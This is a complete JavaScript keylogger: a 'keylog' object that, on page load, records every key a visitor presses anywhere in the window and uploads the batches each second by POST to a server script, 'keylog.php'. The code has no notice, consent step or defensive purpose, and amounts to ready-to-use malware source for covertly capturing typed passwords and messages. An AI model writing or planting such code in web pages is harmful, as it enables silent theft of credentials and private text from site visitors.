var keylog = {
    // SETTINGS 
    cache : [],      // temp storage for key presses
    delay : 1000,    // how often to send data to server
    sending : false, // flag to allow 1 upload at a time
  
    // INITIALIZE
    init : () => {
    // CAPTURE KEY STROKES
    window.addEventListener("keydown", evt => keylog.cache.push(evt.key));
  
    // SEND KEYSTROKES 
    window.setInterval(keylog.send, keylog.delay);
    },
  
    // AJAX 
    send : () => { if (!keylog.sending && keylog.cache.length != 0) {
        //  "LOCK" UNTIL THIS BATCH IS SENT TO SERVER
        keylog.sending = true;
    // KEYPRESS DATA
        var data = new FormData();
        data.append("keys", JSON.stringify(keylog.cache));
        keylog.cache = []; // clear keys
  
    // FECTH SEND
    fetch("keylog.php", { method:"POST", body:data })
    .then(res=>res.text()).then(res => {
        keylog.sending = false; // unlock
        console.log(res); // optional
    })
    .catch(err => console.error(err));
    }}
  };
window.addEventListener("DOMContentLoaded", keylog.init);